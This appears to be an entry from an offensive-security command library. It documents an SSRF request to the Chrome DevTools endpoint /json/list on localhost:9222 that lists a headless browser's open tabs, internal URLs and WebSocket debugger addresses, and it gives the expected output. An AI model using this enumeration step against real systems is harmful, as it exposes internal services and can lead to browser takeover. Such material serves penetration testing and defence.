---
data: GET /json/list
tags:
  - ssrf
  - debugging
  - enumeration
type: command
output: 'JSON array of tabs with URLs, titles, and WebSocket URLs'
executor: http
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T04:39:10.003Z'
id: 1f5de1a4-d6e3-4405-a1d1-12c34b66e2a8
verified: false
validated: true
submitted: true
---
# get-chrome-debug-json-list

## Command

```http
GET /json/list
```

## Description

Accesses the Chrome DevTools Protocol endpoint via SSRF to list all open tabs (WebSocket targets) in the headless Chrome instance, leaking internal URLs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Endpoint is fixed | N/A |

## Examples

### Basic Usage

Request to http://localhost:9222/json/list

### Advanced Usage

Use /json for version info or /json/version.

## Expected Output

{"description":"", "devtoolsFrontendUrl":"/...","id":"...","title":"...","type":"page","url":"https://internal-url","webSocketDebuggerUrl":"ws://..."}

## Related

- [[commands/create-iframe-ssrf-chrome]]
- [[tools/chrome-devtools-protocol]]
